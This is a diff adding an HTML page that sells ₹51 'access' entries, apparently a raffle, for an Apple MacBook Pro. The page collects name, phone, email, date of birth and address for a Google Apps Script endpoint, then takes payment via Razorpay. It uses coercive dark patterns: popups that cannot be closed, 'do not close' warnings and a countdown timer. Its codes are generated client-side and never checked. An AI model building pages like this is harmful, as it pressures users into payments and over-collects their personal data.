@@ -1,0 +1,880 @@
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crapd.in</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <script src="https://checkout.razorpay.com/v1/checkout.js"></script>
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        /* CSS Variables for consistent theming */
+        :root {
+            --primary: #4a148c;
+            --secondary: #7b1fa2;
+            --accent: #e91e63;
+            --light: #f5f5f5;
+            --dark: #212121;
+            --success: #4caf50;
+            --warning: #ff9800;
+            --card-bg: #ffffff;
+            --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            --transition: all 0.3s ease;
+        }
+
+        /* Universal box-sizing and font family */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        /* Body styling for background and text color */
+        body {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: var(--light);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        /* Main content area styling */
+        main {
+            padding-top: 100px;
+            max-width: 1700px;
+            margin: 0 auto;
+            padding: 100px 20px 50px;
+        }
+
+        /* Product Section Styling */
+        .product-section {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            overflow: hidden;
+            margin-bottom: 3rem;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(123, 31, 162, 0.2);
+        }
+
+        .product-header {
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            padding: 1.5rem;
+            text-align: center;
+        }
+
+        .product-header h2 {
+            font-size: 2rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .product-content {
+            display: flex;
+            flex-wrap: wrap;
+            padding: 2rem;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .product-image {
+            flex: 1;
+            min-width: 300px;
+            padding: 1rem;
+        }
+
+        .product-image img {
+            width: 100%;
+            border-radius: 10px;
+            box-shadow: var(--shadow);
+        }
+
+        .product-details {
+            flex: 2;
+            min-width: 300px;
+            padding: 1rem;
+        }
+
+        .price-container {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            margin: 1.5rem 0;
+        }
+
+        .original-price {
+            font-size: 1.8rem;
+            text-decoration: line-through;
+            color: #b0b0b0;
+        }
+
+        .lottery-price {
+            font-size: 2.5rem;
+            font-weight: 700;
+            color: var(--accent);
+        }
+
+        .features {
+            margin: 1.5rem 0;
+        }
+
+        .features h3 {
+            margin-bottom: 1rem;
+            color: #bb86fc;
+        }
+
+        .features ul {
+            padding-left: 1.5rem;
+        }
+
+        .features li {
+            margin-bottom: 0.5rem;
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+            margin-top: 2rem;
+        }
+
+        .btn {
+            padding: 12px 25px;
+            border-radius: 50px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+            border: none;
+            font-size: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            text-decoration: none;
+            justify-content: center;
+        }
+
+        .btn-primary {
+            background: linear-gradient(90deg, var(--accent), #ff4081);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(233, 30, 99, 0.4);
+        }
+
+        .btn-secondary {
+            background: transparent;
+            color: var(--light);
+            border: 2px solid var(--secondary);
+        }
+
+        .btn-secondary:hover {
+            background: rgba(123, 31, 162, 0.2);
+        }
+
+        /* Responsive Styles */
+        @media (max-width: 992px) {
+            .product-content {
+                flex-direction: column;
+            }
+            .product-image {
+                max-width: 80%;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .nav-links {
+                display: none;
+                position: absolute;
+                top: 70px;
+                left: 0;
+                right: 0;
+                background: rgba(26, 26, 46, 0.95);
+                flex-direction: column;
+                align-items: center;
+                padding: 1rem 0;
+                box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
+            }
+            .nav-links.active {
+                display: flex;
+            }
+            .nav-links li {
+                margin: 0.8rem 0;
+            }
+            .hamburger {
+                display: block;
+            }
+        }
+
+        @media (max-width: 576px) {
+            .price-container {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 10px;
+            }
+            .action-buttons {
+                flex-direction: column;
+            }
+            .btn {
+                width: 100%;
+                justify-content: center;
+            }
+        }
+
+        /* Popup Styles */
+        #popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            z-index: 999;
+        }
+
+        .popup {
+            display: none;
+            background: #1a002c;
+            color: #fff;
+            padding: 25px;
+            border-radius: 20px;
+            box-shadow: 0 0 30px rgba(255, 0, 255, 0.4);
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 1000;
+            width: 90%;
+            max-width: 500px;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        .popup input,
+        .popup button,
+        .popup select,
+        .popup textarea {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 10px;
+            border: none;
+            font-size: 16px;
+        }
+
+        .popup input,
+        .popup textarea {
+            background: #f5f5f5;
+            color: #000;
+        }
+
+        .popup textarea {
+            min-height: 100px;
+            resize: vertical;
+        }
+
+        .popup label {
+            display: block;
+            margin-bottom: 5px;
+            color: #bb86fc;
+        }
+
+        .popup button[type="submit"],
+        .popup button#okayBtn,
+        #razorpay-payment-btn,
+        #downloadTicketsBtn {
+            background: linear-gradient(90deg, var(--accent), #ff4081);
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            padding: 12px;
+            margin-top: 15px;
+            border-radius: 10px;
+            border: none;
+            font-size: 16px;
+        }
+
+        #ticketDisplay {
+            font-weight: bold;
+            color: #00ffcc;
+            font-size: 20px;
+            word-break: break-word;
+            text-align: center;
+            max-height: 200px;
+            overflow-y: auto;
+            padding: 10px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
+            margin: 10px 0;
+        }
+
+        #countryError {
+            color: red;
+            font-size: 13px;
+            display: none;
+            margin-top: -5px;
+            margin-bottom: 10px;
+        }
+
+        #submitMessage {
+            color: #00ffcc;
+            font-size: 1.1rem;
+            text-align: center;
+            margin-top: 10px;
+            display: none;
+        }
+
+        #timerDisplay {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: var(--accent);
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        .quantity-selector {
+            margin: 15px 0;
+        }
+
+        .quantity-selector label {
+            display: block;
+            margin-bottom: 8px;
+            color: #bb86fc;
+        }
+
+        .quantity-info {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 5px;
+            font-size: 0.9rem;
+            color: #ccc;
+        }
+
+        .total-price {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: var(--accent);
+            text-align: right;
+            margin: 10px 0;
+        }
+
+        @media (max-width: 480px) {
+            .popup {
+                padding: 20px;
+            }
+            .popup input,
+            .popup button,
+            .popup select,
+            .popup textarea {
+                font-size: 14px;
+                padding: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div id="header-container"></div>
+    <h1 class="hidden-h1">Crapd.in</h1>
+
+    <main>
+
+        <section class="product-section">
+            <div class="product-header">
+                <h2>Apple MacBook Pro 14" (M3)</h2>
+            </div>
+            <div class="product-content">
+                <div class="product-image">
+                    <img src="mbp1.png" alt="Apple MacBook Pro 14 inch">
+                </div>
+                <div class="product-details">
+                    <h3>Apple MacBook Pro 14" with M3 Chip</h3>
+                    <p>Experience unparalleled power and performance with the MacBook Pro, featuring the revolutionary M3 chip, a stunning Liquid Retina XDR display, and an all-day battery life. Designed for pros who demand the best.</p>
+                    <div class="price-container">
+                        <div class="original-price">Original Price: ₹1,69,900</div>
+                        <div class="lottery-price">Access Fee: ₹51 per entry</div>
+                    </div>
+                    <div class="features">
+                        <h3>Key Features:</h3>
+                        <ul>
+                            <li>🚀 Powered by the Apple M3 chip for incredible speed and efficiency</li>
+                            <li>💻 14.2-inch Liquid Retina XDR display with ProMotion technology</li>
+                            <li>🔋 Up to 22 hours of battery life on a single charge</li>
+                            <li>📸 1080p FaceTime HD camera and high-fidelity six-speaker sound system</li>
+                            <li>⌨️ Magic Keyboard with Touch ID for secure login and payments</li>
+                            <li>🌐 Wi-Fi 6E and Bluetooth 5.3 for super-fast connectivity</li>
+                            <li>🔌 Thunderbolt / USB 4, HDMI, SDXC card slot, and MagSafe 3 port</li>
+                            <li>💾 8 GB Unified Memory and 512 GB SSD storage</li>
+                            <li>📦 Comes with a 70W USB-C Power Adapter and USB-C to MagSafe 3 Cable</li>
+                            <li>🎨 Available in Space Grey and Silver finishes</li>
+                        </ul>
+                    </div>
+                    <div class="action-buttons">
+                        <button class="btn btn-primary" id="participate-btn">
+                            <i class="fas fa-ticket-alt"></i> Get Access
+                        </button>
+                        <button class="btn btn-secondary" onclick="window.open('https://www.apple.com/in/macbook-pro/', '_blank')">
+                            <i class="fas fa-external-link-alt"></i> View on Apple
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <div id="popup-overlay"></div>
+
+    <div class="popup" id="popupForm">
+        <h2 style="text-align: center;">Do not refresh or close the window!</h2>
+        <form id="accessForm">
+            <input type="text" name="field1" required placeholder="Your Full Name (min 10 characters)" autocomplete="name" minlength="10" />
+            <input type="tel" name="field2" required placeholder="Phone Number (10 digits)" autocomplete="tel" pattern="[0-9]{10}" />
+            <input type="email" name="field3" required placeholder="Email Address" autocomplete="email" />
+
+            <div>
+                <label for="dobField">Date of Birth:</label>
+                <input type="date" id="dobField" name="field4" required />
+            </div>
+
+            <input type="text" name="field5" required placeholder="City/Place (e.g. Mumbai, Delhi)" autocomplete="address-level2" list="cities" />
+
+            <textarea name="field6" required placeholder="Complete Address (min 30 characters) - Include street, area, landmark, city, state, and PIN code" autocomplete="street-address" minlength="30" rows="4"></textarea>
+            <span id="countryError">Please enter a complete address with at least 30 characters.</span>
+
+            <div class="quantity-selector">
+                <label for="ticketQuantity">Number of Entries (Max 50):</label>
+                <select id="ticketQuantity" name="ticketQuantity" required>
+                    <option value="" disabled selected>Select quantity</option>
+                    </select>
+                <div class="quantity-info">
+                    <span>₹51 per Entry</span>
+                    <span class="total-price">Total: ₹0</span>
+                </div>
+            </div>
+
+            <input type="hidden" name="ticket" id="ticketCode" />
+            <button type="submit">Submit Details</button>
+            <span id="submitMessage">Submitting... Please wait</span>
+        </form>
+    </div>
+
+    <div class="popup" id="paymentStep">
+        <h2>Complete Your Payment</h2>
+        <p>Please complete the payment to finalize your product access. Click the button below.</p>
+        <div id="paymentSummary"></div>
+        <div id="timerDisplay">Time remaining: 05:00</div>
+        <button id="razorpay-payment-btn">Pay with Razorpay</button>
+        <p style="margin-top: 10px; font-size: 0.9em; color: #ccc;">
+            After payment, please wait for automatic verification. Do not close this window.
+        </p>
+    </div>
+
+    <div class="popup" id="ticketStep">
+        <h2>🎉 Congratulations! Your Access Codes are Ready! 🎉</h2>
+        <p>You have purchased <span id="ticketCountDisplay"></span>:</p>
+        <div id="ticketDisplay"></div>
+        <button id="downloadTicketsBtn"><i class="fas fa-download"></i> Download Codes as Text File</button>
+        <p style="margin-top: 15px;">📸 Please take a screenshot for proof and reference.</p>
+        <button id="okayBtn">Okay, Got It!</button>
+    </div>
+
+    <div id="footer-container"></div>
+
+    <script>
+        // Popup Elements
+        const participateBtn = document.getElementById('participate-btn');
+        const popupOverlay = document.getElementById('popup-overlay');
+        const allPopups = document.querySelectorAll('.popup');
+        const popupForm = document.getElementById('popupForm');
+        const paymentStep = document.getElementById('paymentStep');
+        const ticketStep = document.getElementById('ticketStep');
+        const timerDisplay = document.getElementById('timerDisplay');
+        const razorpayBtn = document.getElementById('razorpay-payment-btn');
+        const submitMessage = document.getElementById('submitMessage');
+        const ticketQuantity = document.getElementById('ticketQuantity');
+        const totalPriceDisplay = document.querySelector('.total-price');
+        const paymentSummary = document.getElementById('paymentSummary');
+        const ticketCountDisplay = document.getElementById('ticketCountDisplay');
+        const downloadTicketsBtn = document.getElementById('downloadTicketsBtn');
+
+        // Form & Ticket Elements
+        const form = document.getElementById('accessForm');
+        const ticketInput = document.getElementById('ticketCode');
+        const ticketDisplay = document.getElementById('ticketDisplay');
+        const okayBtn = document.getElementById('okayBtn');
+
+        let generatedTickets = [];
+        let paymentTimeout = null;
+        let countdownInterval = null;
+        const PAYMENT_TIME_LIMIT = 5 * 60; // 5 minutes in seconds
+        const TICKET_PRICE = 51; // Price per entry set to ₹51
+        let selectedQuantity = 1;
+        let allowClose = false;
+
+        // Initialize quantity selector
+        function initQuantitySelector() {
+            const maxTickets = 50;
+            ticketQuantity.innerHTML = '<option value="" disabled selected>Select quantity</option>';
+
+            for (let i = 1; i <= maxTickets; i++) {
+                const option = document.createElement('option');
+                option.value = i;
+                option.textContent = i + (i === 1 ? ' entry' : ' entries');
+                ticketQuantity.appendChild(option);
+            }
+
+            // Set default value to 1
+            ticketQuantity.value = 1;
+            updateTotalPrice();
+        }
+
+        // Update total price display
+        function updateTotalPrice() {
+            selectedQuantity = parseInt(ticketQuantity.value) || 1;
+            const total = selectedQuantity * TICKET_PRICE;
+            totalPriceDisplay.textContent = `Total: ₹${total}`;
+        }
+
+        // Generate multiple codes with incrementing last 2 digits
+        function generateFormattedTickets(...fields) {
+            generatedTickets = [];
+            const tickets = [];
+
+            // Generate a base code
+            const uniqueFields = [...fields, Date.now()];
+            const base = btoa(uniqueFields.join('')).replace(/[^A-Z0-9]/gi, '').toUpperCase();
+            let raw = base.padEnd(20, 'X').substring(0, 18);
+
+            // Generate codes with incrementing last 2 digits
+            for (let i = 0; i < selectedQuantity; i++) {
+                const lastTwoDigits = (5 + i).toString().padStart(2, '0');
+                const ticket = (raw + lastTwoDigits).match(/.{1,4}/g).join('-');
+                generatedTickets.push(ticket);
+                tickets.push(ticket);
+            }
+
+            return tickets.join(', ');
+        }
+
+        // Download codes as text file
+        function downloadTickets() {
+            const ticketContent = generatedTickets.join('\n\n');
+            const blob = new Blob([ticketContent], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'my_access_codes.txt';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+
+        // --- FUNCTIONS TO CONTROL POPUPS ---
+        function closeAllPopups() {
+            if (!allowClose) return;
+
+            clearTimers();
+            popupOverlay.style.display = 'none';
+            allPopups.forEach(p => p.style.display = 'none');
+            document.body.style.overflow = 'auto';
+            submitMessage.style.display = 'none';
+            allowClose = false;
+        }
+
+        function openPopup(popupElement) {
+            document.body.style.overflow = 'hidden';
+            popupOverlay.style.display = 'block';
+            popupElement.style.display = 'block';
+            allowClose = false;
+        }
+
+        function clearTimers() {
+            if (paymentTimeout) clearTimeout(paymentTimeout);
+            if (countdownInterval) clearInterval(countdownInterval);
+            paymentTimeout = null;
+            countdownInterval = null;
+        }
+
+        // --- EVENT LISTENERS ---
+        participateBtn.addEventListener('click', () => {
+            initQuantitySelector();
+            openPopup(popupForm);
+        });
+
+        ticketQuantity.addEventListener('change', updateTotalPrice);
+
+        popupOverlay.addEventListener('click', function(e) {
+            if (allowClose) {
+                closeAllPopups();
+            } else {
+                const messageBox = document.createElement('div');
+                messageBox.style.cssText = `
+                    position: fixed;
+                    top: 50%;
+                    left: 50%;
+                    transform: translate(-50%, -50%);
+                    background: #ff4081;
+                    color: white;
+                    padding: 20px;
+                    border-radius: 10px;
+                    z-index: 1001;
+                    box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+                    font-size: 1.1rem;
+                    text-align: center;
+                    animation: fadeOut 3s forwards;
+                `;
+                messageBox.textContent = "Please complete the form or payment process before closing.";
+                document.body.appendChild(messageBox);
+
+                const styleSheet = document.createElement('style');
+                styleSheet.type = 'text/css';
+                styleSheet.innerText = `
+                    @keyframes fadeOut {
+                        0% { opacity: 1; }
+                        80% { opacity: 1; }
+                        100% { opacity: 0; display: none; }
+                    }
+                `;
+                document.head.appendChild(styleSheet);
+
+                setTimeout(() => {
+                    messageBox.remove();
+                    styleSheet.remove();
+                }, 3000);
+            }
+        });
+
+        allPopups.forEach(p => p.addEventListener('click', e => e.stopPropagation()));
+        okayBtn.addEventListener('click', function() {
+            allowClose = true;
+            closeAllPopups();
+        });
+
+        razorpayBtn.addEventListener('click', handleRazorpayPayment);
+        downloadTicketsBtn.addEventListener('click', downloadTickets);
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const data = {
+                field1: form.field1.value.trim(),
+                field2: form.field2.value.trim(),
+                field3: form.field3.value.trim(),
+                field4: form.field4.value,
+                field5: form.field5.value.trim(),
+                field6: form.field6.value.trim(),
+                quantity: selectedQuantity
+            };
+
+            if (data.field1.length < 10) {
+                showCustomAlert("Please enter your full name (minimum 10 characters)");
+                return;
+            }
+
+            if (!/^\d{10}$/.test(data.field2)) {
+                showCustomAlert("Please enter a valid 10-digit phone number");
+                return;
+            }
+
+            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.field3)) {
+                showCustomAlert("Please enter a valid email address");
+                return;
+            }
+
+            if (!data.field4) {
+                showCustomAlert("Please select your date of birth");
+                return;
+            }
+
+            if (data.field5.length < 3) {
+                showCustomAlert("Please enter a valid city/place name");
+                return;
+            }
+
+            if (data.field6.length < 30) {
+                document.getElementById('countryError').style.display = 'block';
+                showCustomAlert("Please enter a complete address with at least 30 characters");
+                return;
+            }
+            document.getElementById('countryError').style.display = 'none';
+
+            submitMessage.style.display = 'block';
+            form.querySelector('button[type="submit"]').disabled = true;
+
+            data.ticket = generateFormattedTickets(...Object.values(data));
+            ticketInput.value = data.ticket;
+
+            const urlEncoded = new URLSearchParams(data);
+
+            fetch(
+                "https://script.google.com/macros/s/AKfycbxqzb4Yre9AvKrccxARn3sXZHClj5ghYSh_satCVgBvdDAttmkvueWPaDoOVlac9HEC/exec", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                    body: urlEncoded
+                }
+            ).then(res => res.text()).then(res => {
+                submitMessage.style.display = 'none';
+                form.querySelector('button[type="submit"]').disabled = false;
+
+                if (res === "Success") {
+                    popupForm.style.display = 'none';
+                    openPopup(paymentStep);
+                    paymentSummary.innerHTML = `
+                        <p>You are purchasing ${selectedQuantity} access code${selectedQuantity > 1 ? 's' : ''} at ₹${TICKET_PRICE} each</p>
+                        <p class="total-price">Total Amount: ₹${selectedQuantity * TICKET_PRICE}</p>
+                    `;
+                    startPaymentTimer();
+                } else {
+                    console.error("Submission failed: " + res);
+                    showCustomAlert("There was an error submitting your form. Please try again.");
+                }
+            }).catch(err => {
+                submitMessage.style.display = 'none';
+                form.querySelector('button[type="submit"]').disabled = false;
+                console.error("An unexpected error occurred. Please check your connection and try again:", err);
+                showCustomAlert("An unexpected error occurred. Please check your connection and try again.");
+            });
+        });
+
+        function showCustomAlert(message) {
+            const alertBox = document.createElement('div');
+            alertBox.style.cssText = `
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                background: #e91e63;
+                color: white;
+                padding: 20px 30px;
+                border-radius: 10px;
+                z-index: 1002;
+                box-shadow: 0 5px 15px rgba(0,0,0,0.4);
+                font-size: 1.1rem;
+                text-align: center;
+                max-width: 80%;
+                animation: fadeInOut 4s forwards;
+            `;
+            alertBox.textContent = message;
+            document.body.appendChild(alertBox);
+
+            const styleSheet = document.createElement('style');
+            styleSheet.type = 'text/css';
+            styleSheet.innerText = `
+                @keyframes fadeInOut {
+                    0% { opacity: 0; transform: translate(-50%, -40%); }
+                    10% { opacity: 1; transform: translate(-50%, -50%); }
+                    90% { opacity: 1; transform: translate(-50%, -50%); }
+                    100% { opacity: 0; transform: translate(-50%, -60%); display: none; }
+                }
+            `;
+            document.head.appendChild(styleSheet);
+
+            setTimeout(() => {
+                alertBox.remove();
+                styleSheet.remove();
+            }, 4000);
+        }
+
+        function handleRazorpayPayment() {
+            const totalAmount = selectedQuantity * TICKET_PRICE * 100;
+            const options = {
+                "key": "rzp_test_xGe3n7XgxLGqIT",
+                "amount": totalAmount.toString(),
+                "currency": "INR",
+                "name": "Crapd.in",
+                "description": `Payment for MacBook Pro Access`,
+                "image": "https://placehold.co/100x100/4a148c/ffffff?text=Crapd",
+                "handler": function(response) {
+                    console.log("Payment successful:", response);
+                    console.log("Razorpay Payment ID:", response.razorpay_payment_id);
+                    paymentSuccess();
+                },
+                "prefill": {
+                    "name": form.field1.value,
+                    "email": form.field3.value,
+                    "contact": form.field2.value
+                },
+                "notes": {
+                    "address": `${form.field5.value}, ${form.field6.value}`,
+                    "ticket_count": selectedQuantity.toString()
+                },
+                "theme": {
+                    "color": "#4a148c"
+                },
+                "modal": {
+                    "ondismiss": function() {
+                        console.log('Razorpay checkout modal closed.');
+                    }
+                }
+            };
+
+            const rzp1 = new Razorpay(options);
+            rzp1.on('payment.failed', function(response) {
+                console.error("Payment Failed:", response.error);
+                showCustomAlert(`Payment Failed: ${response.error.description} (Code: ${response.error.code})`);
+            });
+            rzp1.open();
+        }
+
+        function startPaymentTimer() {
+            let timeLeft = PAYMENT_TIME_LIMIT;
+            updateTimerDisplay();
+
+            function updateTimerDisplay() {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                timerDisplay.textContent = `Time remaining: ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            }
+
+            countdownInterval = setInterval(() => {
+                timeLeft--;
+                updateTimerDisplay();
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    showCustomAlert("Payment time expired. Please try again.");
+                    allowClose = true;
+                    closeAllPopups();
+                }
+            }, 1000);
+
+            paymentTimeout = setTimeout(() => {
+                if (paymentTimeout) {
+                    clearTimers();
+                    showCustomAlert("Payment timed out. Please try again.");
+                    allowClose = true;
+                    closeAllPopups();
+                }
+            }, PAYMENT_TIME_LIMIT * 1000);
+        }
+
+        function paymentSuccess() {
+            clearTimers();
+            paymentStep.style.display = 'none';
+            openPopup(ticketStep);
+
+            ticketDisplay.textContent = generatedTickets.join('\n\n');
+            ticketCountDisplay.textContent = `${selectedQuantity} access code${selectedQuantity > 1 ? 's' : ''}`;
+
+            allowClose = false;
+        }
+
+        // Mobile menu toggle
+        const hamburger = document.querySelector('.hamburger');
+        const navLinks = document.querySelector('.nav-links');
+        if (hamburger && navLinks) {
+            hamburger.addEventListener('click', () => {
+                navLinks.classList.toggle('active');
+            });
+        }
+    </script>
+    <script src="script.js" defer></script>
+</body>
+</html>
+```
